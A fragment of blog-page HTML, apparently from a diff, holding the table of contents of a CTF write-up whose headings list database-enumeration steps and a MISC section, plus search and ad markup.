href="#%E7%A1%AE%E8%AE%A4%E5%BD%93%E5%89%8D%E7%BD%91%E7%AB%99%E5%9C%A8%E7%94%A8%E5%93%AA%E4%B8%AA%E6%95%B0%E6%8D%AE%E5%BA%93"><span class="toc-number">1.6.0.0.4.</span> <span class="toc-text">确认当前网站在用哪个数据库</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E5%AE%9A%E5%88%97%E5%87%BA%E5%BA%93%E5%86%85%E6%89%80%E6%9C%89%E8%A1%A8"><span class="toc-number">1.6.0.0.5.</span> <span class="toc-text">确定列出库内所有表</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%A1%AE%E8%AE%A4%E5%88%97%E5%87%BA%E6%89%80%E6%9C%89%E5%88%97%E5%90%8D"><span class="toc-number">1.6.0.0.6.</span> <span class="toc-text">确认列出所有列名</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8F%90%E5%8F%96-flag"><span class="toc-number">1.6.0.0.7.</span> <span class="toc-text">提取 flag</span></a></li></ol></li></ol></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MISC"><span class="toc-number">2.</span> <span class="toc-text">MISC</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%85%A5%E9%97%A8"><span class="toc-number">2.1.</span> <span class="toc-text">1.入门</span></a></li></ol></li></ol>
+                </div>
+            </button>
+            
+
+            
+
+            <a href="#nexmoe-content" class="backtop toc-link" aria-label="Back To Top" title="top"><button class="mdui-fab mdui-ripple"><i class="nexmoefont icon-caret-top"></i></button></a>
+        </div>
+    </div>
+</div></div><div id="nexmoe-footer"><!--!--></div><div id="nexmoe-search-space"><div class="search-container"><div class="search-header"><div class="search-input-container"><input class="search-input" type="text" placeholder="Search" onInput="sinput();"></div><a class="search-close" onclick="sclose();">×</a></div><div class="search-body"></div></div></div><div><script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-2058306854838448" crossorigin="anonymous"></script>
+</div></body></html>
